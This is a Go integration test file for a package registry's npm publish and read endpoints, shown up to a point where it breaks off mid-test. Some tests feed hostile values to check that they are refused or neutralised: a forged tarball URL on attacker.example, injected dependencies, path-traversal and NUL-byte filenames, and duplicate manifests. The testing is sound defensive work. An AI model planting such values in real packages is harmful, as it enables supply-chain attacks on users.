//go:build integration

package npm

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strconv"
	"strings"
	"testing"

	"github.com/google/go-cmp/cmp"

	"github.com/spj/sindri/internal/auth"
	"github.com/spj/sindri/internal/cas"
	"github.com/spj/sindri/internal/db"
	"github.com/spj/sindri/internal/model"
	"github.com/spj/sindri/internal/registry"
	"github.com/spj/sindri/internal/remote"
	"github.com/spj/sindri/internal/resolve"
	"github.com/spj/sindri/internal/server"
	"github.com/spj/sindri/internal/storage/memstore"
	"github.com/spj/sindri/internal/testsupport"
)

const (
	testRepo      = "team/internal"
	testPublicURL = "https://registry.example"

	adminToken    = "admin"
	readerToken   = "reader"
	outsiderToken = "outsider"
	// ciToken is a machine token that may publish to testRepo.
	ciToken = "sindri_ci"
)

// tokenPrincipals answers with the principal named by the Bearer token, so a
// test can choose its caller without an identity provider.
type tokenPrincipals map[string]auth.Principal

func (p tokenPrincipals) Authenticate(_ context.Context, r *http.Request) (auth.Principal, error) {
	token, _ := strings.CutPrefix(r.Header.Get("Authorization"), "Bearer ")
	principal, ok := p[token]
	if !ok {
		return auth.Principal{}, errors.New("unknown test token")
	}
	return principal, nil
}

// Verify makes the same table the login check, so a token that authenticates a
// request also passes login.
func (p tokenPrincipals) Verify(_ context.Context, raw string) (auth.Principal, error) {
	principal, ok := p[raw]
	if !ok {
		return auth.Principal{}, errors.New("unknown test token")
	}
	return principal, nil
}

type npmFixture struct {
	t    *testing.T
	ts   *httptest.Server
	reg  *registry.Registry
	data *db.DB
}

// newFixture serves the adapter through the real server, so the path reaches it
// the way a client's does, with a real Postgres behind it and one hosted
// repository, testRepo.
func newFixture(t *testing.T, publicURL string) *npmFixture {
	t.Helper()
	return newFixtureLogging(t, publicURL, slog.New(slog.NewTextHandler(io.Discard, nil)))
}

// newFixtureLogging is newFixture with the server's logger chosen by the test.
func newFixtureLogging(t *testing.T, publicURL string, logger *slog.Logger) *npmFixture {
	t.Helper()
	database := testsupport.MigratedDB(t)
	blobs := memstore.New()
	store := cas.New(blobs, cas.WithReserver(db.NewBlobReserver(database, "memory")))
	reg := registry.New(database, store, "memory")
	resolver := resolve.New(reg, remote.New(remote.Options{Registry: reg}))

	principals := tokenPrincipals{
		adminToken:    {Subject: "bootstrap", Kind: auth.KindBootstrap, Admin: true},
		readerToken:   {Subject: "token:reader", Kind: auth.KindMachine, Token: &auth.TokenScope{Repository: testRepo, Role: auth.RoleRead}},
		outsiderToken: {Subject: "token:outsider", Kind: auth.KindMachine, Token: &auth.TokenScope{Repository: "elsewhere", Role: auth.RoleWrite}},
		ciToken:       {Subject: "token:ci", Kind: auth.KindMachine, Token: &auth.TokenScope{Repository: testRepo, Role: auth.RoleWrite}},
	}
	srv, err := server.New(server.Options{
		Address:  "127.0.0.1:0",
		Database: database,
		Blobs:    blobs,
		NPM:      Handler(Options{Resolver: resolver, Auth: principals, Verifier: principals, PublicURL: publicURL}),
		Logger:   logger,
	})
	if err != nil {
		t.Fatalf("server.New: %v", err)
	}
	ts := httptest.NewServer(srv.Handler())
	t.Cleanup(ts.Close)

	f := &npmFixture{t: t, ts: ts, reg: reg, data: database}
	f.createRepo(registry.CreateRepositoryParams{Name: testRepo, Type: model.RepoTypeHosted})
	return f
}

func (f *npmFixture) createRepo(p registry.CreateRepositoryParams) {
	f.t.Helper()
	p.Protocol = model.ProtocolNPM
	if _, err := f.reg.CreateRepository(f.t.Context(), p); err != nil {
		f.t.Fatalf("CreateRepository %s: %v", p.Name, err)
	}
}

func (f *npmFixture) do(token, method, path string, body []byte) (int, []byte, http.Header) {
	f.t.Helper()
	req, err := http.NewRequestWithContext(f.t.Context(), method, f.ts.URL+path, bytes.NewReader(body))
	if err != nil {
		f.t.Fatalf("building request: %v", err)
	}
	req.Header.Set("Authorization", "Bearer "+token)
	res, err := f.ts.Client().Do(req)
	if err != nil {
		f.t.Fatalf("%s %s: %v", method, path, err)
	}
	defer func() { _ = res.Body.Close() }()
	got, err := io.ReadAll(res.Body)
	if err != nil {
		f.t.Fatalf("reading %s %s: %v", method, path, err)
	}
	return res.StatusCode, got, res.Header
}

func (f *npmFixture) put(pkgPath string, body []byte) (int, []byte) {
	f.t.Helper()
	status, got, _ := f.do(adminToken, http.MethodPut, "/npm/"+testRepo+"/"+pkgPath, body)
	return status, got
}

func (f *npmFixture) mustPublishTo(repo, pkgPath, name, version string, tgz []byte) {
	f.t.Helper()
	status, got, _ := f.do(adminToken, http.MethodPut, "/npm/"+repo+"/"+pkgPath, publishBody(f.t, name, version, tgz))
	if status != http.StatusCreated {
		f.t.Fatalf("publish %s@%s = %d %s, want 201", name, version, status, got)
	}
}

func (f *npmFixture) mustPublish(name, version string) {
	f.t.Helper()
	f.mustPublishTo(testRepo, name, name, version, packageTarball(f.t, name, version))
}

// mustPublishTagged publishes a version that moves tag, not latest.
func (f *npmFixture) mustPublishTagged(name, version, tag string) {
	f.t.Helper()
	doc := publishDocument(f.t, name, version, packageTarball(f.t, name, version))
	doc["dist-tags"] = map[string]any{tag: version}
	if status, got := f.put(name, encodeDocument(f.t, doc)); status != http.StatusCreated {
		f.t.Fatalf("publish %s@%s = %d %s, want 201", name, version, status, got)
	}
}

func (f *npmFixture) packument(pkgPath string) packumentView {
	f.t.Helper()
	status, got, _ := f.do(adminToken, http.MethodGet, "/npm/"+testRepo+"/"+pkgPath, nil)
	if status != http.StatusOK {
		f.t.Fatalf("GET packument %s = %d %s", pkgPath, status, got)
	}
	var view packumentView
	if err := json.Unmarshal(got, &view); err != nil {
		f.t.Fatalf("decoding packument: %v\n%s", err, got)
	}
	return view
}

func (f *npmFixture) count(sql string, args ...any) int {
	f.t.Helper()
	var n int
	if err := f.data.Pool().QueryRow(f.t.Context(), sql, args...).Scan(&n); err != nil {
		f.t.Fatalf("%s: %v", sql, err)
	}
	return n
}

// packumentView reads a packument the way a client does. Each version keeps its
// raw fields so a test can see what is there and what is not.
type packumentView struct {
	ID       string                     `json:"_id"`
	Name     string                     `json:"name"`
	DistTags map[string]string          `json:"dist-tags"`
	Versions map[string]json.RawMessage `json:"versions"`
}

type distView struct {
	Tarball   string `json:"tarball"`
	Integrity string `json:"integrity"`
	Shasum    string `json:"shasum"`
}

func (p packumentView) field(t *testing.T, version, key string) (json.RawMessage, bool) {
	t.Helper()
	raw, ok := p.Versions[version]
	if !ok {
		t.Fatalf("packument has no version %s: %v", version, p.Versions)
	}
	var fields map[string]json.RawMessage
	if err := json.Unmarshal(raw, &fields); err != nil {
		t.Fatalf("decoding version %s: %v", version, err)
	}
	value, ok := fields[key]
	return value, ok
}

func (p packumentView) dist(t *testing.T, version string) distView {
	t.Helper()
	raw, ok := p.field(t, version, "dist")
	if !ok {
		t.Fatalf("version %s has no dist", version)
	}
	var d distView
	if err := json.Unmarshal(raw, &d); err != nil {
		t.Fatalf("decoding dist of %s: %v", version, err)
	}
	return d
}

func manifestJSON(name, version string) string {
	return fmt.Sprintf(`{"name":%q,"version":%q,"main":"index.js"}`, name, version)
}

func manifestTarball(t *testing.T, manifest string) []byte {
	t.Helper()
	return buildTarball(t,
		tarEntry{name: "package/package.json", body: manifest},
		tarEntry{name: "package/index.js", body: "module.exports = 1\n"},
	)
}

func packageTarball(t *testing.T, name, version string) []byte {
	t.Helper()
	return manifestTarball(t, manifestJSON(name, version))
}

// publishDocument is the document npm 10 sends, with its dist values correct.
func publishDocument(t *testing.T, name, version string, tgz []byte) map[string]any {
	t.Helper()
	info, err := hashTarball(bytes.NewReader(tgz))
	if err != nil {
		t.Fatalf("hashing tarball: %v", err)
	}
	return map[string]any{
		"_id":       name,
		"name":      name,
		"dist-tags": map[string]any{"latest": version},
		"versions": map[string]any{
			version: map[string]any{
				"_id":     name + "@" + version,
				"name":    name,
				"version": version,
				"dist": map[string]any{
					"integrity": info.Integrity,
					"shasum":    info.Shasum,
					"tarball":   "http://client.guess/" + name + "-" + version + ".tgz",
				},
			},
		},
		"_attachments": map[string]any{
			name + "-" + version + ".tgz": map[string]any{
				"content_type": "application/octet-stream",
				"data":         base64.StdEncoding.EncodeToString(tgz),
				"length":       len(tgz),
			},
		},
	}
}

func encodeDocument(t *testing.T, doc map[string]any) []byte {
	t.Helper()
	body, err := json.Marshal(doc)
	if err != nil {
		t.Fatalf("encoding publish document: %v", err)
	}
	return body
}

func publishBody(t *testing.T, name, version string, tgz []byte) []byte {
	t.Helper()
	return encodeDocument(t, publishDocument(t, name, version, tgz))
}

// member walks nested objects of a publish document.
func member(t *testing.T, doc map[string]any, keys ...string) map[string]any {
	t.Helper()
	for _, key := range keys {
		next, ok := doc[key].(map[string]any)
		if !ok {
			t.Fatalf("document has no object at %q", key)
		}
		doc = next
	}
	return doc
}

func wantJSONError(t *testing.T, body []byte) string {
	t.Helper()
	var parsed struct {
		Error string `json:"error"`
	}
	if err := json.Unmarshal(body, &parsed); err != nil || parsed.Error == "" {
		t.Fatalf("body = %q, want a JSON error field (err %v)", body, err)
	}
	return parsed.Error
}

func TestPublish_ScopedAndUnscopedRoundTrip(t *testing.T) {
	f := newFixture(t, testPublicURL)
	cases := []struct {
		name    string
		putPath string
		pkg     string
	}{
		{name: "scoped", putPath: "@acme%2fui", pkg: "@acme/ui"},
		{name: "unscoped with a dot", putPath: "foo.bar", pkg: "foo.bar"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			tgz := packageTarball(t, tc.pkg, "1.0.0")
			status, got := f.put(tc.putPath, publishBody(t, tc.pkg, "1.0.0", tgz))
			if status != http.StatusCreated || !bytes.Contains(got, []byte(`"ok":true`)) {
				t.Fatalf("PUT = %d %s, want 201 with ok", status, got)
			}

			doc := f.packument(tc.putPath)
			if doc.ID != tc.pkg || doc.Name != tc.pkg {
				t.Fatalf("packument _id, name = %q, %q, want %q", doc.ID, doc.Name, tc.pkg)
			}
			if diff := cmp.Diff(map[string]string{"latest": "1.0.0"}, doc.DistTags); diff != "" {
				t.Fatalf("dist-tags (-want +got):\n%s", diff)
			}

			info, err := hashTarball(bytes.NewReader(tgz))
			if err != nil {
				t.Fatalf("hashing tarball: %v", err)
			}
			dist := doc.dist(t, "1.0.0")
			if dist.Integrity != info.Integrity || dist.Shasum != info.Shasum {
				t.Fatalf("dist = %+v, want integrity %s, shasum %s", dist, info.Integrity, info.Shasum)
			}

			link, err := url.Parse(dist.Tarball)
			if err != nil {
				t.Fatalf("dist.tarball %q: %v", dist.Tarball, err)
			}
			status, bytesGot, header := f.do(adminToken, http.MethodGet, link.EscapedPath(), nil)
			if status != http.StatusOK || !bytes.Equal(bytesGot, tgz) {
				t.Fatalf("GET %s = %d with %d bytes, want the %d published", link.EscapedPath(), status, len(bytesGot), len(tgz))
			}
			if got, want := header.Get("Content-Length"), strconv.Itoa(len(tgz)); got != want {
				t.Fatalf("Content-Length = %q, want %q", got, want)
			}

			status, bytesGot, header = f.do(adminToken, http.MethodHead, link.EscapedPath(), nil)
			if status != http.StatusOK || len(bytesGot) != 0 || header.Get("Content-Length") != strconv.Itoa(len(tgz)) {
				t.Fatalf("HEAD = %d with %d body bytes, Content-Length %q", status, len(bytesGot), header.Get("Content-Length"))
			}
		})
	}
}

func TestPublish_RecordsThePrincipalAsActor(t *testing.T) {
	f := newFixture(t, testPublicURL)
	f.mustPublish("foo", "1.0.0")
	if n := f.count(`SELECT count(*) FROM dist_tag_events WHERE actor = 'bootstrap' AND to_version = '1.0.0'`); n == 0 {
		t.Fatal("the publish's dist-tag event does not name the caller")
	}
}

func TestRoutes_OtherMethodsAre405(t *testing.T) {
	f := newFixture(t, testPublicURL)
	cases := []struct {
		name   string
		method string
		path   string
	}{
		{name: "packument", method: http.MethodDelete, path: "/npm/" + testRepo + "/foo"},
		{name: "tarball", method: http.MethodPut, path: "/npm/" + testRepo + "/foo/-/foo-1.0.0.tgz"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if status, got, _ := f.do(adminToken, tc.method, tc.path, nil); status != http.StatusMethodNotAllowed {
				t.Fatalf("%s %s = %d %s, want 405", tc.method, tc.path, status, got)
			}
		})
	}
}

func TestPublish_RepublishIs409WithErrorField(t *testing.T) {
	f := newFixture(t, testPublicURL)
	tgz := packageTarball(t, "foo", "1.0.0")
	body := publishBody(t, "foo", "1.0.0", tgz)
	if status, got := f.put("foo", body); status != http.StatusCreated {
		t.Fatalf("first PUT = %d %s", status, got)
	}
	status, got := f.put("foo", body)
	if status != http.StatusConflict {
		t.Fatalf("second PUT = %d %s, want 409", status, got)
	}
	wantJSONError(t, got)
}

func TestPublish_MismatchedIntegrityIsRefusedAndNothingPlaced(t *testing.T) {
	cases := []struct {
		name  string
		field string
		value string
	}{
		{name: "integrity", field: "integrity", value: "sha512-" + base64.StdEncoding.EncodeToString(make([]byte, 64))},
		{name: "shasum", field: "shasum", value: strings.Repeat("0", 40)},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			f := newFixture(t, testPublicURL)
			tgz := packageTarball(t, "foo", "1.0.0")
			doc := publishDocument(t, "foo", "1.0.0", tgz)
			member(t, doc, "versions", "1.0.0", "dist")[tc.field] = tc.value

			blobsBefore := f.count(`SELECT count(*) FROM blobs`)
			status, got := f.put("foo", encodeDocument(t, doc))
			if status != http.StatusBadRequest {
				t.Fatalf("PUT = %d %s, want 400", status, got)
			}
			wantJSONError(t, got)

			if status, got, _ := f.do(adminToken, http.MethodGet, "/npm/"+testRepo+"/foo", nil); status != http.StatusNotFound {
				t.Fatalf("GET after refusal = %d %s, want 404", status, got)
			}
			if blobsAfter := f.count(`SELECT count(*) FROM blobs`); blobsAfter != blobsBefore {
				t.Fatalf("blobs went from %d to %d", blobsBefore, blobsAfter)
			}
		})
	}
}

func TestPublish_ForgedDistNeverReachesAReader(t *testing.T) {
	f := newFixture(t, testPublicURL)
	tgz := packageTarball(t, "foo", "1.0.0")
	doc := publishDocument(t, "foo", "1.0.0", tgz)
	member(t, doc, "versions", "1.0.0", "dist")["tarball"] = "https://attacker.example/evil.tgz"
	if status, got := f.put("foo", encodeDocument(t, doc)); status != http.StatusCreated {
		t.Fatalf("PUT = %d %s, want 201", status, got)
	}
	dist := f.packument("foo").dist(t, "1.0.0")
	if want := testPublicURL + "/npm/" + testRepo + "/foo/-/foo-1.0.0.tgz"; dist.Tarball != want {
		t.Fatalf("dist.tarball = %q, want %q", dist.Tarball, want)
	}
}

func TestPublish_ManifestComesFromTheTarball(t *testing.T) {
	f := newFixture(t, testPublicURL)

	t.Run("body dependencies are ignored", func(t *testing.T) {
		doc := publishDocument(t, "foo", "1.0.0", packageTarball(t, "foo", "1.0.0"))
		member(t, doc, "versions", "1.0.0")["dependencies"] = map[string]any{"evil": "1"}
		if status, got := f.put("foo", encodeDocument(t, doc)); status != http.StatusCreated {
			t.Fatalf("PUT = %d %s, want 201", status, got)
		}
		packument := f.packument("foo")
		if deps, ok := packument.field(t, "1.0.0", "dependencies"); ok {
			t.Fatalf("packument serves the body's dependencies: %s", deps)
		}
		if main, _ := packument.field(t, "1.0.0", "main"); string(main) != `"index.js"` {
			t.Fatalf("packument main = %s, want the tarball's", main)
		}
	})

	t.Run("tarball dist and deprecated are not served", func(t *testing.T) {
		manifest := `{"name":"bar","version":"1.0.0","dist":{"tarball":"https://attacker.example/x.tgz"},"deprecated":"forged"}`
		tgz := manifestTarball(t, manifest)
		if status, got := f.put("bar", publishBody(t, "bar", "1.0.0", tgz)); status != http.StatusCreated {
			t.Fatalf("PUT = %d %s, want 201", status, got)
		}
		packument := f.packument("bar")
		if dep, ok := packument.field(t, "1.0.0", "deprecated"); ok {
			t.Fatalf("packument serves the tarball's deprecated: %s", dep)
		}
		if tarball := packument.dist(t, "1.0.0").Tarball; !strings.HasPrefix(tarball, testPublicURL) {
			t.Fatalf("dist.tarball = %q, want it under publicUrl", tarball)
		}
	})
}

func TestPublish_DisagreementIsRefused(t *testing.T) {
	f := newFixture(t, testPublicURL)
	good := func(t *testing.T) []byte { return packageTarball(t, "foo", "1.0.0") }
	cases := []struct {
		name    string
		path    string // defaults to foo
		tarball func(t *testing.T) []byte
		mutate  func(t *testing.T, doc map[string]any)
		rewrite func(body []byte) []byte
	}{
		{name: "path name differs from body name", path: "other"},
		{
			name: "body has no name",
			mutate: func(_ *testing.T, doc map[string]any) {
				delete(doc, "name")
			},
		},
		{
			name:    "body name differs from tarball name",
			tarball: func(t *testing.T) []byte { return packageTarball(t, "bar", "1.0.0") },
		},
		{
			name:    "body version differs from tarball version",
			tarball: func(t *testing.T) []byte { return packageTarball(t, "foo", "2.0.0") },
		},
		{
			name: "tarball spells its name in another case only",
			tarball: func(t *testing.T) []byte {
				return manifestTarball(t, `{"NAME":"foo","version":"1.0.0"}`)
			},
		},
		{
			name: "versions entry names another package",
			mutate: func(t *testing.T, doc map[string]any) {
				member(t, doc, "versions", "1.0.0")["name"] = "other"
			},
		},
		{
			name: "versions entry states another version",
			mutate: func(t *testing.T, doc map[string]any) {
				member(t, doc, "versions", "1.0.0")["version"] = "2.0.0"
			},
		},
		{
			name: "versions holds two entries",
			mutate: func(t *testing.T, doc map[string]any) {
				member(t, doc, "versions")["2.0.0"] = map[string]any{"name": "foo", "version": "2.0.0"}
			},
		},
		{
			name: "versions is empty",
			mutate: func(_ *testing.T, doc map[string]any) {
				doc["versions"] = map[string]any{}
			},
		},
		{
			name: "two attachments",
			mutate: func(t *testing.T, doc map[string]any) {
				member(t, doc, "_attachments")["second.tgz"] = map[string]any{"data": "AAAA"}
			},
		},
		{
			name: "attachment length is wrong",
			mutate: func(t *testing.T, doc map[string]any) {
				member(t, doc, "_attachments", "foo-1.0.0.tgz")["length"] = 1
			},
		},
		{
			name: "attachment length is not a number",
			mutate: func(t *testing.T, doc map[string]any) {
				member(t, doc, "_attachments", "foo-1.0.0.tgz")["length"] = "many"
			},
		},
		{
			name: "attachment has no data",
			mutate: func(t *testing.T, doc map[string]any) {
				delete(member(t, doc, "_attachments", "foo-1.0.0.tgz"), "data")
			},
		},
		{
			name: "dist-tags with two entries",
			mutate: func(t *testing.T, doc map[string]any) {
				member(t, doc, "dist-tags")["next"] = "1.0.0"
			},
		},
		{
			name: "dist-tags points at another version",
			mutate: func(t *testing.T, doc map[string]any) {
				doc["dist-tags"] = map[string]any{"latest": "9.9.9"}
			},
		},
		{
			name: "dist-tag spelled like a version",
			mutate: func(_ *testing.T, doc map[string]any) {
				doc["dist-tags"] = map[string]any{"2.0.0": "1.0.0"}
			},
		},
		{
			name: "repeated _attachments emptied by the last",
			rewrite: func(body []byte) []byte {
				return append(bytes.TrimSuffix(body, []byte("}")), []byte(`,"_attachments":{}}`)...)
			},
		},
		{
			name: "repeated _attachments nulled by the last",
			rewrite: func(body []byte) []byte {
				return append(bytes.TrimSuffix(body, []byte("}")), []byte(`,"_attachments":null}`)...)
			},
		},
		{
			name: "repeated _attachments adding a second",
			rewrite: func(body []byte) []byte {
				return append(bytes.TrimSuffix(body, []byte("}")), []byte(`,"_attachments":{"b":{"data":"AAAA"}}}`)...)
			},
		},
		{name: "uppercase name", path: "Foo"},
		{name: "name that is a dot segment", path: "%2e%2e"},
		{name: "name that is the route separator", path: "%2d"},
		{
			name: "invalid version",
			mutate: func(t *testing.T, doc map[string]any) {
				versions := member(t, doc, "versions")
				entry := member(t, versions, "1.0.0")
				entry["version"] = "1.0"
				delete(versions, "1.0.0")
				versions["1.0"] = entry
				doc["dist-tags"] = map[string]any{"latest": "1.0"}
			},
			tarball: func(t *testing.T) []byte { return packageTarball(t, "foo", "1.0") },
		},
		{
			name: "no package/package.json",
			tarball: func(t *testing.T) []byte {
				return buildTarball(t, tarEntry{name: "package/index.js", body: "1"})
			},
		},
		{
			name: "two package/package.json",
			tarball: func(t *testing.T) []byte {
				return buildTarball(t,
					tarEntry{name: "package/package.json", body: manifestJSON("foo", "1.0.0")},
					tarEntry{name: "package/package.json", body: manifestJSON("evil", "1.0.0")},
				)
			},
		},
		{
			name:    "tarball is not a tarball",
			tarball: func(*testing.T) []byte { return []byte("not gzip") },
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			tarball := good
			if tc.tarball != nil {
				tarball = tc.tarball
			}
			doc := publishDocument(t, "foo", "1.0.0", tarball(t))
			if tc.mutate != nil {
				tc.mutate(t, doc)
			}
			body := encodeDocument(t, doc)
			if tc.rewrite != nil {
				body = tc.rewrite(body)
			}
			path := tc.path
			if path == "" {
				path = "foo"
			}
			status, got := f.put(path, body)
			if status != http.StatusBadRequest {
				t.Fatalf("PUT = %d %s, want 400", status, got)
			}
			wantJSONError(t, got)
			if status, got, _ := f.do(adminToken, http.MethodGet, "/npm/"+testRepo+"/foo", nil); status != http.StatusNotFound {
				t.Fatalf("GET after refusal = %d %s, want 404", status, got)
			}
		})
	}
}

func TestPublish_RefusalsDoNotEchoTheBody(t *testing.T) {
	f := newFixture(t, testPublicURL)
	const secret = "npm_supersecretvalue"
	doc := publishDocument(t, "foo", "1.0.0", packageTarball(t, "foo", "1.0.0"))
	doc["name"] = secret
	status, got := f.put("foo", encodeDocument(t, doc))
	if status != http.StatusBadRequest {
		t.Fatalf("PUT = %d %s, want 400", status, got)
	}
	if bytes.Contains(got, []byte(secret)) {
		t.Fatalf("the refusal echoes the body: %s", got)
	}
}

func TestPublish_ManifestPostgresCannotHoldIs400(t *testing.T) {
	f := newFixture(t, testPublicURL)
	const prefix = `{"name":"foo","version":"1.0.0",`
	cases := []struct {
		name     string
		manifest string
	}{
		{name: "escaped NUL", manifest: prefix + `"description":"a\u0000b"}`},
		{name: "escaped NUL in a key", manifest: prefix + `"a\u0000b":1}`},
		{name: "invalid UTF-8", manifest: prefix + "\"description\":\"a\xffb\"}"},
		{name: "lone high surrogate", manifest: prefix + `"description":"\ud83d"}`},
		{name: "lone low surrogate", manifest: prefix + `"description":"\ude00"}`},
		{name: "high surrogate before an ordinary escape", manifest: prefix + `"description":"\ud83dA"}`},
		{name: "number too large", manifest: prefix + `"n":1e999999}`},
		{name: "number too small", manifest: prefix + `"n":1e-999999}`},
		{name: "number with too many digits", manifest: prefix + `"n":` + strings.Repeat("9", 200000) + `}`},
		{name: "nested past the bound", manifest: prefix + `"n":` + strings.Repeat("[", maxManifestDepth) + strings.Repeat("]", maxManifestDepth) + `}`},
		{name: "nested to encoding/json's limit", manifest: prefix + `"n":` + strings.Repeat("[", 9999) + strings.Repeat("]", 9999) + `}`},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			tgz := manifestTarball(t, tc.manifest)
			status, got := f.put("foo", publishBody(t, "foo", "1.0.0", tgz))
			if status != http.StatusBadRequest {
				t.Fatalf("PUT = %d %.200s, want 400", status, got)
			}
			wantJSONError(t, got)
		})
	}
}

func TestPublish_UnusualManifestsAreStoredAndServed(t *testing.T) {
	f := newFixture(t, testPublicURL)
	const prefix = `{"name":"foo","version":"%s",`
	cases := []struct {
		name    string
		version string
		rest    string
	}{
		{name: "a surrogate pair", version: "1.0.0", rest: `"description":"\ud83d\ude00"}`},
		{name: "an escaped backslash before u0000 is not a NUL", version: "1.0.1", rest: `"description":"\\u0000"}`},
		{name: "the largest number allowed", version: "1.0.2", rest: `"n":1e1000,"m":-1E-1000}`},
		{name: "the longest number allowed", version: "1.0.3", rest: `"n":` + strings.Repeat("9", maxManifestNumber) + `}`},
		{name: "the deepest nesting allowed", version: "1.0.4", rest: `"n":` + strings.Repeat("[", maxManifestDepth-1) + strings.Repeat("]", maxManifestDepth-1) + `}`},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			tgz := manifestTarball(t, fmt.Sprintf(prefix, tc.version)+tc.rest)
			if status, got := f.put("foo", publishBody(t, "foo", tc.version, tgz)); status != http.StatusCreated {
				t.Fatalf("PUT = %d %.200s, want 201", status, got)
			}
			f.packument("foo").dist(t, tc.version)
		})
	}
}

func TestPublish_ReadOnlyCallerGets403(t *testing.T) {
	f := newFixture(t, testPublicURL)
	body := publishBody(t, "foo", "1.0.0", packageTarball(t, "foo", "1.0.0"))
	status, got, _ := f.do(readerToken, http.MethodPut, "/npm/"+testRepo+"/foo", body)
	if status != http.StatusForbidden {
		t.Fatalf("PUT = %d %s, want 403", status, got)
	}
	wantJSONError(t, got)
}

func TestPublish_UnreadableRepositoryIs404(t *testing.T) {
	f := newFixture(t, testPublicURL)
	f.mustPublish("foo", "1.0.0")
	body := publishBody(t, "foo", "2.0.0", packageTarball(t, "foo", "2.0.0"))
	cases := []struct {
		name   string
		method string
		path   string
		body   []byte
	}{
		{name: "publish", method: http.MethodPut, path: "/npm/" + testRepo + "/foo", body: body},
		{name: "packument", method: http.MethodGet, path: "/npm/" + testRepo + "/foo"},
		{name: "tarball", method: http.MethodGet, path: "/npm/" + testRepo + "/foo/-/foo-1.0.0.tgz"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			status, got, _ := f.do(outsiderToken, tc.method, tc.path, tc.body)
			if status != http.StatusNotFound {
				t.Fatalf("%s %s = %d %s, want 404", tc.method, tc.path, status, got)
			}
		})
	}
}

func TestTarball_PlacementCheckedFirst(t *testing.T) {
	f := newFixture(t, testPublicURL)
	f.createRepo(registry.CreateRepositoryParams{Name: "team/other", Type: model.RepoTypeHosted})
	tgz := packageTarball(t, "foo", "1.0.0")
	f.mustPublishTo(testRepo, "foo", "foo", "1.0.0", tgz)

	if status, _, _ := f.do(adminToken, http.MethodGet, "/npm/"+testRepo+"/foo/-/foo-1.0.0.tgz", nil); status != http.StatusOK {
		t.Fatalf("GET through the placed repository = %d, want 200", status)
	}
	status, got, _ := f.do(adminToken, http.MethodGet, "/npm/team/other/foo/-/foo-1.0.0.tgz", nil)
	if status != http.StatusNotFound {
		t.Fatalf("GET through the other repository = %d, want 404", status)
	}
	if bytes.Contains(got, tgz) {
		t.Fatal("the 404 carries the tarball's bytes")
	}
}

func TestTarball_OnlyTheExactFilenameExists(t *testing.T) {
	f := newFixture(t, testPublicURL)
	f.mustPublish("foo", "1.0.0")
	f.mustPublish("foo-bar", "1.0.0")
	cases := []struct {
		name string
		path string
	}{
		{name: "another package's file", path: "foo/-/foo-bar-1.0.0.tgz"},
		{name: "an unknown version", path: "foo/-/foo-2.0.0.tgz"},
		{name: "a NUL in the filename", path: "foo/-/foo-1.0.0%00.tgz"},
		{name: "invalid UTF-8 in the filename", path: "foo/-/foo-1.0.0%ff.tgz"},
		{name: "an encoded path", path: "foo/-/..%2ffoo-1.0.0.tgz"},
		{name: "a case variant", path: "foo/-/FOO-1.0.0.tgz"},
		{name: "a dot-segment package", path: "%2e%2e/-/foo-1.0.0.tgz"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			status, got, _ := f.do(adminToken, http.MethodGet, "/npm/"+testRepo+"/"+tc.path, nil)
			if status != http.StatusNotFound {
				t.Fatalf("GET %s = %d %s, want 404", tc.path, status, got)
			}
		})
	}
}

func TestRead_ProxyAndVirtualAre501UntilSprint3(t *testing.T) {
	f := newFixture(t, testPublicURL)
	f.createRepo(registry.CreateRepositoryParams{Name: "up", Type: model.RepoTypeProxy, UpstreamURL: "https://registry.npmjs.org"})
	f.createRepo(registry.CreateRepositoryParams{Name: "all", Type: model.RepoTypeVirtual, Members: []string{testRepo, "up"}})
	for _, repo := range []string{"up", "all"} {
		t.Run(repo, func(t *testing.T) {
			for _, path := range []string{"/npm/" + repo + "/foo", "/npm/" + repo + "/foo/-/foo-1.0.0.tgz"} {
				if status, got, _ := f.do(adminToken, http.MethodGet, path, nil); status != http.StatusNotImplemented {
					t.Fatalf("GET %s = %d %s, want 501", path, status, got)
				}
			}
			body := publishBody(t, "foo", "1.0.0", packageTarball(t, "foo", "1.0.0"))
			if status, got, _ := f.do(adminToken, http.MethodPut, "/npm/"+repo+"/foo", body); status != http.StatusMethodNotAllowed {
				t.Fatalf("PUT = %d %s, want 405", status, got)
			}
		})
	}
}

func TestPackument_NoPublicUrlIs503(t *testing.T) {
	f := newFixture(t, "")
	f.mustPublish("foo", "1.0.0")
	status, got, _ := f.do(adminToken, http.MethodGet, "/npm/"+testRepo+"/foo", nil)
	if status != http.StatusServiceUnavailable {
		t.Fatalf("GET = %d %s, want 503", status, got)
	}
	if msg := wantJSONError(t, got); !strings.Contains(msg, "publicUrl") {
		t.Fatalf("error = %q, want it to name publicUrl", msg)
	}
}

func TestPackument_IgnoresAcceptAndWriteQuery(t *testing.T) {
	f := newFixture(t, testPublicURL)
	f.mustPublish("foo", "1.0.0")
	_, plain, _ := f.do(adminToken, http.MethodGet, "/npm/"+testRepo+"/foo", nil)

	req, err := http.NewRequestWithContext(t.Context(), http.MethodGet, f.ts.URL+"/npm/"+testRepo+"/foo?write=true", nil)
	if err != nil {
		t.Fatalf("building request: %v", err)
	}
	req.Header.Set("Authorization", "Bearer "+adminToken)
	req.Header.Set("Accept", "application/vnd.npm.install-v1+json")
	res, err := f.ts.Client().Do(req)
	if err != nil {
		t.Fatalf("GET: %v", err)
	}
	defer func() { _ = res.Body.Close() }()
	got, err := io.ReadAll(res.Body)
	if err != nil {
		t.Fatalf("reading: %v", err)
	}
	if !bytes.Equal(plain, got) {
		t.Fatalf("responses differ:\n%s\n%s", plain, got)
	}
}

func TestPackument_ReportsDeprecatedAndFallsBackLatest(t *testing.T) {
	f := newFixture(t, testPublicURL)
	ctx := t.Context()

	t.Run("the highest non-prerelease, compared as versions", func(t *testing.T) {
		f.mustPublish("foo", "1.0.0")
		for _, v := range []string{"1.9.0", "1.10.0", "2.0.0-rc.1"} {
			f.mustPublishTagged("foo", v, "next")
		}
